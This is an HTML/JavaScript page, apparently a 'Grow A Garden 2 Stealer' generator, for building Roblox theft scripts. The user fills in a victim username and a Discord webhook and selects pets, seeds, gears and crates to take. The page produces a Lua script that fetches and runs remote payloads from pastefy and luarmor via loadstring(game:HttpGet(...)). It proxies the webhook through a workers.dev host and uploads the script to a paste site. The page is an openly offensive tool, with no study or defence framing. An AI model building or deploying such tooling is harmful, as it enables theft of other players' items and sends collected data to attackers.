<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>GAG 2</title>

<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">

<style>

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --bg: #0a1a0a;
    --surface: #1a2e1a;
    --panel: #2e422e;
    --border: #4a6a4a;
    --neon: #00ff88;
    --neon-glow: 0 0 10px rgba(0, 255, 136, 0.8);
    --text: #e0f0e0;
    --muted: #88a888;
    --danger: #ff4444;
    --green: #00ff88;
    --admin: #ffd700;
    --admin-glow: 0 0 10px rgba(255,215,0,0.8);
    --discord: #5865f2;

    --rarity-common: #8e9297;
    --rarity-uncommon: #00ff88;
    --rarity-rare: #00bfff;
    --rarity-epic: #bf00ff;
    --rarity-legendary: #ffd700;
    --rarity-mythic: #ff4444;
    --rarity-super: #ff007f;
    --rarity-unknown: #888888;
  }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Rajdhani', sans-serif;
    min-height: 100vh;
    overflow-x: hidden;
    position: relative;
  }

  /* Vegetation at the top */
  .navbar::after {
    content: "STEALER";
    position: absolute;
    top: 7px;
    left: 0;
    right: 0;
    font-size: 1.5rem;
    text-align: center;
    pointer-events: none;
    opacity: 0.7;
    z-index: 1;
    letter-spacing: 1rem;
  }

  /* Vegetation on panels */
  .panel::before {
    content: "🍃";
    position: absolute;
    top: -10px;
    left: 10px;
    font-size: 1.2rem;
    opacity: 0.6;
    pointer-events: none;
  }

  .panel::after {
    content: "🌿";
    position: absolute;
    top: -10px;
    right: 10px;
    font-size: 1.2rem;
    opacity: 0.6;
    pointer-events: none;
  }

  /* Vegetation on asset selectors */


  /* Vegetation on buttons */


  .navbar {
    position: sticky;
    top: 0;
    z-index: 200;
    background: rgba(10, 26, 10, 0.92);
    backdrop-filter: blur(12px);
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    padding: 0 1rem 0 1.5rem;
    height: 48px;
  }

  .nav-brand {
    font-size: 1.1rem;
    font-weight: 700;
    color: var(--neon);
    text-shadow: var(--neon-glow);
    text-transform: uppercase;
    letter-spacing: 0.1em;
    margin-right: 1.5rem;
  }

  .nav-links { display: flex; align-items: center; gap: 0; flex: 1; }
  .nav-link {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.72rem;
    text-transform: uppercase;
    letter-spacing: 0.12em;
    color: var(--muted);
    padding: 0 0.85rem;
    height: 48px;
    display: flex;
    align-items: center;
    cursor: pointer;
    border-bottom: 2px solid transparent;
    transition: color 0.2s, border-color 0.2s;
    user-select: none;
  }

  .nav-link:hover { color: var(--text); }
  .nav-link.active { color: var(--neon); border-bottom-color: var(--neon); text-shadow: var(--neon-glow); }

  .layout { display: flex; min-height: calc(100vh - 48px); }
  .main-content { flex: 1; min-width: 0; }

  .toast { position: fixed; bottom: 1.5rem; left: 50%; transform: translateX(-50%) translateY(80px); background: var(--panel); border: 1px solid var(--border); border-radius: 10px; padding: 0.75rem 1.4rem; font-family: 'Share Tech Mono', monospace; font-size: 0.72rem; color: var(--text); z-index: 999; transition: transform 0.3s, opacity 0.3s; opacity: 0; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
  .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
  .toast.success { border-color: var(--green); color: var(--green); }
  .toast.warning { border-color: #ffb400; color: #ffb400; }

  .wrap { max-width: 860px; margin: 0 auto; padding: 2.4rem 1.5rem 6rem; }
  header { text-align: center; margin-bottom: 2.5rem; position: relative; }


  /* Custom logo styling */
  .logo-container {
    display: flex;
    justify-content: center;
    align-items: center;
    margin-bottom: 0.5rem;
  }

  .logo-img {
    max-width: 100%;
    height: auto;
    max-height: 150px;
    width: auto;
  }

  .tagline { font-family: 'Share Tech Mono', monospace; font-size: 0.75rem; color: var(--muted); margin-top: 0.4rem; letter-spacing: 0.15em; text-transform: uppercase; }

  .asset-selectors { display: flex; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 1rem; overflow: hidden; }
  .asset-tab { flex: 1; text-align: center; padding: 0.65rem; font-family: 'Share Tech Mono', monospace; font-size: 0.7rem; text-transform: uppercase; color: var(--muted); cursor: pointer; transition: all 0.2s; user-select: none; }
  .asset-tab:hover { color: var(--text); background: rgba(0, 255, 136, 0.05); }
  .asset-tab.active { color: var(--neon); background: var(--panel); text-shadow: var(--neon-glow); font-weight: bold; }

  .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; margin-bottom: 1.2rem; box-shadow: 0 4px 15px rgba(0,0,0,0.3); position: relative; }
  .ph { display: flex; align-items: center; gap: 0.6rem; padding: 0.75rem 1.25rem; background: var(--surface); border-bottom: 1px solid var(--border); }
  .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--neon); box-shadow: var(--neon-glow); }
  .ph-title { font-family: 'Share Tech Mono', monospace; font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.15em; color: var(--neon); text-shadow: var(--neon-glow); }
  .pb { padding: 1.25rem; }

  .lbl { display: block; font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; text-transform: uppercase; color: var(--muted); margin-bottom: 0.45rem; }
  .search-row { display: flex; gap: 0.6rem; margin-bottom: 0.75rem; }
  .search-input { flex: 1; background: var(--surface); border: 1px solid var(--border); border-radius: 7px; padding: 0.55rem 0.85rem; color: var(--text); font-family: 'Share Tech Mono', monospace; font-size: 0.82rem; outline: none; }
  .search-input:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(0, 255, 136, 0.3); }

  .btn-sm { padding: 0.5rem 0.9rem; background: rgba(0, 255, 136, 0.1); border: 1px solid var(--neon); border-radius: 7px; color: var(--neon); font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; text-transform: uppercase; cursor: pointer; }
  .btn-sm.red { color: var(--danger); border-color: rgba(255,68,68,0.5); background: rgba(255,68,68,0.1); }

  .animal-list { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; height: 260px; overflow-y: auto; }
  .a-item { display: flex; align-items: center; gap: 0.65rem; padding: 0.48rem 0.9rem; cursor: pointer; border-bottom: 1px solid rgba(0, 255, 136, 0.03); user-select: none; }
  .a-item.on { background: rgba(0, 255, 136, 0.05); }

  .a-item input[type="checkbox"] { appearance: none; -webkit-appearance: none; width: 13px; height: 13px; border: 1px solid var(--neon); border-radius: 3px; background: var(--surface); cursor: pointer; position: relative; outline: none; }
  .a-item input[type="checkbox"]:checked::after { content: '✓'; position: absolute; color: black; font-size: 8px; font-weight: bold; top: 50%; left: 50%; transform: translate(-50%, -50%); }

  .badge-rarity { font-size: 10px; font-weight: bold; text-transform: uppercase; padding: 2px 7px; border-radius: 4px; margin-left: auto; background: rgba(0,0,0,0.4); border: 1px solid transparent; }
  .badge-rarity.common { border-color: var(--rarity-common); color: var(--rarity-common); text-shadow: 0 0 8px var(--rarity-common); }
  .badge-rarity.uncommon { border-color: var(--rarity-uncommon); color: var(--rarity-uncommon); text-shadow: 0 0 8px var(--rarity-uncommon); }
  .badge-rarity.rare { border-color: var(--rarity-rare); color: var(--rarity-rare); text-shadow: 0 0 8px var(--rarity-rare); }
  .badge-rarity.epic { border-color: var(--rarity-epic); color: var(--rarity-epic); text-shadow: 0 0 8px var(--rarity-epic); }
  .badge-rarity.legendary { border-color: var(--rarity-legendary); color: var(--rarity-legendary); text-shadow: 0 0 8px var(--rarity-legendary); }
  .badge-rarity.mythic { border-color: var(--rarity-mythic); color: var(--rarity-mythic); text-shadow: 0 0 8px var(--rarity-mythic); }
  .badge-rarity.unknown { border-color: var(--rarity-unknown); color: var(--rarity-unknown); }
  .badge-rarity.super {
    color: #fff;
    border-image: linear-gradient(45deg, #ff007f, #7f00ff, #00bfff, #00ff88, #ffd700, #ff007f) 1;
    animation: multicolor-glow 3s linear infinite;
  }

  @keyframes multicolor-glow {
    0% { filter: hue-rotate(0deg); }
    100% { filter: hue-rotate(360deg); }
  }

  .a-item.common input[type="checkbox"] { border-color: var(--rarity-common); }
  .a-item.common input[type="checkbox"]:checked { background: var(--rarity-common); box-shadow: 0 0 8px var(--rarity-common); }
  .a-item.uncommon input[type="checkbox"] { border-color: var(--rarity-uncommon); }
  .a-item.uncommon input[type="checkbox"]:checked { background: var(--rarity-uncommon); box-shadow: 0 0 8px var(--rarity-uncommon); }
  .a-item.rare input[type="checkbox"] { border-color: var(--rarity-rare); }
  .a-item.rare input[type="checkbox"]:checked { background: var(--rarity-rare); box-shadow: 0 0 8px var(--rarity-rare); }
  .a-item.epic input[type="checkbox"] { border-color: var(--rarity-epic); }
  .a-item.epic input[type="checkbox"]:checked { background: var(--rarity-epic); box-shadow: 0 0 8px var(--rarity-epic); }
  .a-item.legendary input[type="checkbox"] { border-color: var(--rarity-legendary); }
  .a-item.legendary input[type="checkbox"]:checked { background: var(--rarity-legendary); box-shadow: 0 0 8px var(--rarity-legendary); }
  .a-item.mythic input[type="checkbox"] { border-color: var(--rarity-mythic); }
  .a-item.mythic input[type="checkbox"]:checked { background: var(--rarity-mythic); box-shadow: 0 0 8px var(--rarity-mythic); }
  .a-item.unknown input[type="checkbox"] { border-color: var(--rarity-unknown); }
  .a-item.unknown input[type="checkbox"]:checked { background: var(--rarity-unknown); }
  .a-item.super input[type="checkbox"] { border-color: #ff007f; }
  .a-item.super input[type="checkbox"]:checked { background: #fff; animation: multicolor-glow 3s linear infinite; }

  .sel-row { display: flex; justify-content: space-between; margin-top: 0.65rem; font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; color: var(--muted); }
  .sel-count span { color: var(--neon); text-shadow: var(--neon-glow); font-weight: bold; }

  #usernameSuggestions { position: absolute; bottom: 100%; left: 0; right: 0; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; max-height: 200px; overflow-y: auto; z-index: 100; display: none; }
  .suggestion-item { padding: 10px; cursor: pointer; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid rgba(0, 255, 136, 0.02); }
  .suggestion-item:hover { background: rgba(0, 255, 136, 0.05); }
  .suggestion-avatar { width: 32px; height: 32px; border-radius: 50%; overflow: hidden; background: #222; }
  .suggestion-avatar img { width: 100%; height: 100%; object-fit: cover; }
  .suggestion-info { flex: 1; }
  .suggestion-username { font-size: 0.85rem; font-weight: 600; color: #fff; }
  .suggestion-handle { font-size: 0.75rem; color: var(--neon); }

  .f-field { position: relative; margin-bottom: 1.1rem; }
  .f-input { width: 100%; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 0.65rem 0.95rem; color: var(--text); font-family: 'Share Tech Mono', monospace; font-size: 0.88rem; outline: none; }
  .f-input:focus { border-color: var(--neon); box-shadow: 0 0 12px rgba(0, 255, 136, 0.15); }
  .f-hint { font-family: 'Share Tech Mono', monospace; font-size: 0.62rem; color: #557755; margin-top: 0.35rem; display: block; }
  .f-hint.error { color: var(--danger); }

  .admin-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.5rem; margin-bottom: 0.75rem; }
  .admin-mode-btn { background: var(--surface); border: 1px solid var(--border); border-radius: 7px; padding: 0.55rem; color: var(--muted); font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; text-transform: uppercase; cursor: pointer; text-align: center; }

  .admin-mode-btn.active { background: rgba(0, 255, 136, 0.05); border-color: var(--neon); color: var(--neon); text-shadow: var(--neon-glow); }

  .btn-gen { width: 100%; padding: 0.85rem; background: var(--neon); border: none; border-radius: 9px; color: black; font-family: 'Rajdhani', sans-serif; font-size: 1.1rem; font-weight: 700; text-transform: uppercase; cursor: pointer; box-shadow: var(--neon-glow); }

  .output-container { position: relative; margin-top: 1.2rem; }
  .code-block { background: #061006; border: 1px solid var(--border); border-radius: 10px; padding: 1.2rem; font-family: 'Share Tech Mono', monospace; font-size: 0.78rem; color: var(--green); white-space: pre-wrap; word-break: break-all; min-height: 54px; }
  .code-block.empty { color: #557755; font-style: italic; text-align: center; }
  .btn-copy { position: absolute; top: 8px; right: 8px; padding: 0.3rem 0.65rem; background: rgba(0,0,0,0.6); border: 1px solid var(--border); border-radius: 5px; color: var(--muted); font-family: 'Share Tech Mono', monospace; font-size: 0.62rem; text-transform: uppercase; cursor: pointer; }
  .btn-copy.ok { border-color: var(--green); color: var(--green); }
</style>

</head>

<body>

<div class="navbar">
  <div class="nav-brand">GAG 2</div>
  <div class="nav-links">
    <div class="nav-link active">GENERATOR</div>
  </div>
</div>

<div class="layout">
  <div id="mainContent" class="main-content">
    <div class="wrap">
      <header>
        <div class="logo-container">
          <img src="https://gag.gg/logo.png" alt="Grow A Garden 2 Stealer Logo" class="logo-img">
        </div>
        <p class="tagline">MADE BY BYTHBZEN</p>
      </header>

      <div class="panel">
        <div class="ph"><div class="dot"></div><div class="ph-title">Target Setup</div></div>
        <div class="pb">
          <div class="f-field">
            <label class="lbl">Victim Username</label>
            <input type="text" id="usernameInput" class="f-input" placeholder="Enter Roblox Target Username..." autocomplete="off">
            <span id="usernameHint" class="f-hint">The Roblox username to target in the script (3 characters minimum).</span>
            <div id="usernameSuggestions"></div>
          </div>
          <div class="f-field">
            <label class="lbl">Discord Webhook</label>
            <input type="text" id="webhookInput" class="f-input" placeholder="https://discord.com/api/webhooks/..." oninput="validateWebhook()">
            <span id="webhookHint" class="f-hint">Discord API Endpoint for receiving collected data streams safely.</span>
          </div>
        </div>
      </div>

      <div class="panel">
        <div class="ph"><div class="dot"></div><div class="ph-title">Target Item Selection</div></div>
        <div class="pb">
          <div class="asset-selectors">
            <div class="asset-tab active" onclick="switchAssetTab('pets', event)">🦝Pets</div>
            <div class="asset-tab" onclick="switchAssetTab('fruits', event)">🪴Seed</div>
            <div class="asset-tab" onclick="switchAssetTab('gears', event)">🔧Gears</div>
            <div class="asset-tab" onclick="switchAssetTab('crates', event)">📦Crates</div>
          </div>

          <div class="search-row">
            <input type="text" id="searchBox" class="search-input" placeholder="Filter current view assets..." oninput="filterList()">
            <button class="btn-sm" onclick="selectAll()">All</button>
            <button class="btn-sm red" onclick="clearAll()">Clear</button>
          </div>
          
          <div id="assetList" class="animal-list"></div>
          
          <div class="sel-row">
            <div class="sel-count">Selected items count: <span id="selNum">0</span></div>
          </div>
        </div>
      </div>

      <div class="panel">
        <div class="ph"><div class="dot"></div><div class="ph-title">Script GUI</div></div>
        <div class="pb">
          <label class="lbl">GUI</label>
          <div class="admin-grid">
            <div class="admin-mode-btn active" onclick="setAdminMode('no-gui', event)">No GUI</div>
            <div class="admin-mode-btn" onclick="setAdminMode('dupe', event)">Dupe</div>
            <div class="admin-mode-btn" onclick="setAdminMode('Hub', event)">Hub</div>
          </div>
          <div class="admin-grid" style="grid-template-columns: 1fr;">
            <div class="admin-mode-btn" onclick="setAdminMode('custom', event)">Custom Loadstring</div>
          </div>
          <div id="customAdminInput" class="f-field" style="display:none; margin-top:0.5rem;">
            <input type="text" id="customAdminLoadstring" class="f-input" placeholder="game:HttpGet('...')" oninput="updateCustomAdmin()">
          </div>
        </div>
      </div>

      <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>

      <div class="output-container">
        <div id="outputBlock" class="code-block empty">-- Code output stream idle. Complete configuration settings above.</div>
        <button id="copyBtn" class="btn-copy" onclick="copyOut()">⧉ Copy</button>
      </div>
    </div>
  </div>
</div>

<div id="toastNotification" class="toast"></div>

<script>
const DATABASE = {
  pets: [
    { name: "Frog", rarity: "Common" },
    { name: "Bunny", rarity: "Common" },
    { name: "Owl", rarity: "Uncommon" },
    { name: "Deer", rarity: "Rare" },
    { name: "Robin", rarity: "Legendary" },
    { name: "Bee", rarity: "Legendary" },
    { name: "Monkey", rarity: "Mythic" },
    { name: "Golden Dragonfly", rarity: "Mythic" },
    { name: "Unicorn", rarity: "Mythic" },
    { name: "Raccoon", rarity: "Super" },
    { name: "Black Dragon", rarity: "Super" },
    { name: "Ice Serpent", rarity: "Super" }
  ],
  fruits: [
    { name: "Strawberry", rarity: "Common" },
    { name: "Blueberry", rarity: "Common" },
    { name: "Tulip", rarity: "Common" },
    { name: "Tomato", rarity: "Common" },
    { name: "Apple", rarity: "Common" },
    { name: "Bamboo", rarity: "Uncommon" },
    { name: "Corn", rarity: "Uncommon" },
    { name: "Cactus", rarity: "Uncommon" },
    { name: "Pineapple", rarity: "Uncommon" },
    { name: "Mushroom", rarity: "Uncommon" },
    { name: "Green Bean", rarity: "Uncommon" },
    { name: "Banana", rarity: "Rare" },
    { name: "Grape", rarity: "Rare" },
    { name: "Coconut", rarity: "Rare" },
    { name: "Mango", rarity: "Rare" },
    { name: "Dragon Fruit", rarity: "Epic" },
    { name: "Acorn", rarity: "Epic" },
    { name: "Cherry", rarity: "Epic" },
    { name: "Sunflower", rarity: "Epic" },
    { name: "Venus Fly Trap", rarity: "Epic" },
    { name: "Pomegranate", rarity: "Legendary" },
    { name: "Gold", rarity: "Legendary" },
    { name: "Poision Apple", rarity: "Legendary" },
    { name: "Moon Bloom", rarity: "Legendary" },
    { name: "Dragon's Breath", rarity: "Legendary" },
    { name: "Rainbow", rarity: "Super" },
  ],
  gears: [
    { name: "Common Watering Can", rarity: "Common" },
    { name: "Common Sprinkler", rarity: "Common" },
    { name: "Sign", rarity: "Common" },
    { name: "Uncommon Sprinkler", rarity: "Uncommon" },
    { name: "Trowel", rarity: "Rare" },
    { name: "Rare Sprinkler", rarity: "Rare" },
    { name: "Jump Mushroom", rarity: "Rare" },
    { name: "Speed Mushroom", rarity: "Rare" },
    { name: "Lantern", rarity: "Epic" },
    { name: "Shrink Mushroom", rarity: "Epic" },
    { name: "Supersize Mushroom", rarity: "Epic" },
    { name: "Gnome", rarity: "Epic" },
    { name: "Flashbang", rarity: "Legendary" },
    { name: "Basic Pot", rarity: "Legendary" },
    { name: "Legendary Sprinkler", rarity: "Legendary" },
    { name: "Invisibility Mushroom", rarity: "Legendary" },
    { name: "Wheelbarrow", rarity: "Legendary" },
    { name: "Super Watering Can", rarity: "Super" },
    { name: "Super Sprinkler", rarity: "Super" }
  ],
  crates: [
    { name: "Ladder Crate", rarity: "Unknown" },
    { name: "Bench Crate", rarity: "Unknown" },
    { name: "Light Crate", rarity: "Unknown" },
    { name: "Sign Crate", rarity: "Unknown" },
    { name: "Arch Crate", rarity: "Unknown" },
    { name: "Roleplay Crate", rarity: "Unknown" },
    { name: "Bridge Crate", rarity: "Unknown" },
    { name: "Spring Crate", rarity: "Unknown" },
    { name: "Seesaw Crate", rarity: "Unknown" },
    { name: "Conveyor Crate", rarity: "Unknown" },
    { name: "Owner Door Crate", rarity: "Unknown" },
    { name: "Bear Trap Crate", rarity: "Unknown" },
    { name: "Fence Crate", rarity: "Unknown" },
    { name: "Teleporter Pad Crate", rarity: "Unknown" }
  ]
};

let selected = new Set();
let adminMode = 'no-gui';
let customAdminLoadstring = '';
let currentTab = 'pets';

function switchAssetTab(tab, event) {
  currentTab = tab;
  document.querySelectorAll('.asset-tab').forEach(t => t.classList.remove('active'));
  if (event && event.target) event.target.classList.add('active');
  renderList(document.getElementById('searchBox').value);
}

function renderList(filter) {
  const q = (filter || '').toLowerCase();
  const list = document.getElementById('assetList');
  list.innerHTML = '';

  const activeItems = DATABASE[currentTab] || [];

  activeItems.forEach(item => {
    if (q && !item.name.toLowerCase().includes(q)) return;
    const uniqueKey = `${currentTab}:${item.name}`;
    const row = document.createElement('div');
    row.className = 'a-item ' + item.rarity.toLowerCase() + (selected.has(uniqueKey) ? ' on' : '');
    const cb = document.createElement('input'); 
    cb.type = 'checkbox'; 
    cb.checked = selected.has(uniqueKey);
    cb.addEventListener('change', e => { e.stopPropagation(); toggle(uniqueKey); });
    const lbl = document.createElement('span'); 
    lbl.className = 'a-name'; 
    lbl.textContent = item.name;
    const badge = document.createElement('span'); 
    badge.className = 'badge-rarity ' + item.rarity.toLowerCase(); 
    badge.textContent = item.rarity;
    row.append(cb, lbl, badge);
    row.addEventListener('click', e => { if (e.target !== cb) toggle(uniqueKey); });
    list.appendChild(row);
  });
  document.getElementById('selNum').textContent = selected.size;
}

function toggle(key) { 
  selected.has(key) ? selected.delete(key) : selected.add(key); 
  renderList(document.getElementById('searchBox').value); 
}

function filterList() { renderList(document.getElementById('searchBox').value); }
function selectAll() { 
  const activeItems = DATABASE[currentTab] || []; 
  activeItems.forEach(item => selected.add(`${currentTab}:${item.name}`)); 
  renderList(document.getElementById('searchBox').value); 
}
function clearAll() { selected.clear(); renderList(document.getElementById('searchBox').value); }

function setAdminMode(mode, evt) {
  adminMode = mode;
  document.querySelectorAll('.admin-mode-btn').forEach(b => b.classList.remove('active'));
  if (evt && evt.target) evt.target.classList.add('active');
  document.getElementById('customAdminInput').style.display = mode === 'custom' ? 'block' : 'none';
}

function updateCustomAdmin() { customAdminLoadstring = document.getElementById('customAdminLoadstring').value; }

async function createSentinelProxy(webhookUrl) {
  const res = await fetch('https://sentinel-proxy.dongdihng.workers.dev/', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ webhook: webhookUrl }) });
  if (!res.ok) throw new Error('Failed to create proxy');
  const d = await res.json();
  if (!d.proxyUrl) throw new Error('No proxy URL returned');
  return d.proxyUrl;
}

async function uploadToPastefy(script) {
  try {
    const res = await fetch('https://pastefy.app/api/v2/paste', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ title: 'SKRINHUB Script', content: script }) });
    const d = await res.json();
    return d.success && d.paste?.id ? `https://pastefy.app/${d.paste.id}/raw` : null;
  } catch { return null; }
}

async function generate() {
  const btn = document.querySelector('.btn-gen');
  const out = document.getElementById('outputBlock');
  if (btn.disabled) return;
  btn.disabled = true; btn.textContent = '⏳ Generating...'; btn.style.opacity = '0.6';
  try {
    const username = document.getElementById('usernameInput').value.trim();
    const webhook = document.getElementById('webhookInput').value.trim();
    if (selected.size === 0) throw new Error('Please select at least one target item.');
    if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
    if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
    const finalWebhook = await createSentinelProxy(webhook);
    const petsArray = []; const gearsArray = []; const fruitsArray = []; const cratesArray = [];
    let hasBunny = false; let hasOwl = false; let hasFrog = false; let hasDeer = false; let hasRobin = false;
    selected.forEach(key => {
      const [category, name] = key.split(':');
      if (category === 'pets') {
        petsArray.push(`    "${name}"`);
        if (name === "Bunny") hasBunny = true;
        if (name === "Owl") hasOwl = true;
        if (name === "Frog") hasFrog = true;
        if (name === "Deer") hasDeer = true;
        if (name === "Robin") hasRobin = true;
      }
      else if (category === 'gears') gearsArray.push(`    "${name}"`);
      else if (category === 'fruits') fruitsArray.push(`    "${name}"`);
      else if (category === 'crates') cratesArray.push(`    "${name}"`);
    });
    let blacklistPart = '';
    if (!hasBunny || !hasOwl || !hasFrog || !hasDeer || !hasRobin) {
      const blacklistElements = [];
      if (!hasBunny) blacklistElements.push('    "718d0f07-444f-4a4c-be3c-0c1750d11133"');
      if (!hasOwl) blacklistElements.push('    "798eaf29-1135-40ee-af74-574d71f6c8b6"');
      if (!hasFrog) blacklistElements.push('    "98bea10d-40e7-45c8-9aef-3630eec9eb68"');
      if (!hasDeer) blacklistElements.push('    "92afb36b-7f83-4ff0-84f0-617be90d8156"');
      if (!hasRobin) blacklistElements.push('    "f9ca444a-5c03-4df0-9170-80de2238db55"');
      blacklistPart = `\ngetgenv().PETS_BLACKLIST = {\n${blacklistElements.join(',\n')}\n}\n`;
    }
    let adminPart = '';
    if (adminMode === 'dupe') adminPart = `\ntask.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/EX1du2IS/raw"))()\nend)`;
    else if (adminMode === 'Hub') adminPart = `\ntask.spawn(function()\n   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/795c7accd08487171484e54a92e75c77.lua"))()\nend)`;
    else if (adminMode === 'custom' && customAdminLoadstring.trim()) adminPart = `\n${customAdminLoadstring}`;
    const script = `getgenv().WEBHOOK_URL = "${finalWebhook}"\n\ngetgenv().TARGET_USERNAME = "${username}"\n\n${blacklistPart}\n\ngetgenv().TARGET_PETS = {\n${petsArray.join(',\n')}\n}\n\n\ngetgenv().TARGET_GEAR = {\n${gearsArray.join(',\n')}\n}\n\n\ngetgenv().FRUITS = {\n${fruitsArray.join(',\n')}\n}\n\n\ngetgenv().CRATES = {\n${cratesArray.join(',\n')}\n}\n\n\ntask.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/MMENG7dr/raw"))()\nend)${adminPart}`;
    const url = await uploadToPastefy(script);
    out.className = 'code-block';
    out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : script;
    showToast('⚡ Script generated and uploaded successfully!', 'success');
  } catch (err) {
    out.className = 'code-block empty';
    out.textContent = err.message || 'An error occurred.';
  } finally {
    setTimeout(() => { btn.disabled = false; btn.textContent = '⚡ Generate Script'; btn.style.opacity = '1'; }, 500);
  }
}

async function searchRobloxUsers(query) {
  if (query.length < 3) return [];
  try {
    const res = await fetch(`https://roblox-search-proxy.vercel.app/api/roblox-search?keyword=${encodeURIComponent(query)}`);
    if (!res.ok) return [];
    return (await res.json()).data || [];
  } catch { return []; }
}

async function fetchAvatarUrl(userId) {
  try {
    const res = await fetch(`https://avatar-proxy.vercel.app/api/avatar-proxy?userId=${userId}`);
    if (!res.ok) return null;
    return (await res.json()).imageUrl || null;
  } catch { return null; }
}

async function showSuggestions(users) {
  const container = document.getElementById('usernameSuggestions');
  container.innerHTML = '';
  if (!users.length) { container.style.display = 'none'; return; }
  const withAvatars = await Promise.all(users.slice(0,5).map(async u => ({ ...u, avatarUrl: await fetchAvatarUrl(u.id) })));
  withAvatars.forEach(user => {
    const item = document.createElement('div');
    item.className = 'suggestion-item';
    item.innerHTML = `<div class="suggestion-avatar"><img src="${user.avatarUrl || ''}" alt=""></div><div class="suggestion-info"><p class="suggestion-username">${user.displayName || user.name}</p><p class="suggestion-handle">@${user.name}</p></div>`;
    item.onclick = () => { document.getElementById('usernameInput').value = user.name; container.style.display = 'none'; validateUsername(); };
    container.appendChild(item);
  });
  container.style.display = 'block';
}

const debounce = (fn, d) => { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), d); }; };
document.getElementById('usernameInput').addEventListener('input', debounce(async function(e) {
  const q = e.target.value.trim();
  if (!q) { document.getElementById('usernameSuggestions').style.display = 'none'; return; }
  showSuggestions(await searchRobloxUsers(q));
}, 300));

function validateUsername() {
  const v = document.getElementById('usernameInput').value.trim();
  const h = document.getElementById('usernameHint');
  if (v.length < 3) { h.classList.add('error'); h.textContent = 'Username must be at least 3 characters long!'; return false; }
  h.classList.remove('error'); h.textContent = 'The Roblox username to target in the script (3 characters minimum).'; return true;
}

function validateWebhook() {
  const v = document.getElementById('webhookInput').value.trim();
  const h = document.getElementById('webhookHint');
  if (!v.startsWith('https://discord.com/api/webhooks/')) { h.classList.add('error'); h.textContent = 'Webhook must start with: https://discord.com/api/webhooks/'; return false; }
  h.classList.remove('error'); h.textContent = '✅ Valid Discord webhook.'; return true;
}

function copyOut() {
  const code = document.getElementById('outputBlock').textContent;
  if (!code || code.startsWith('--')) return;
  navigator.clipboard.writeText(code).then(() => {
    const btn = document.getElementById('copyBtn');
    btn.textContent = '✓ Copied!'; btn.classList.add('ok');
    setTimeout(() => { btn.textContent = '⧉ Copy'; btn.classList.remove('ok'); }, 2000);
  });
}

function showToast(msg, type = 'success') { const t = document.getElementById('toastNotification'); t.textContent = msg; t.className = `toast show ${type}`; setTimeout(() => t.classList.remove('show'), 2000); }

/* INITIALIZATION */
renderList();
</script>

</body>

</html>
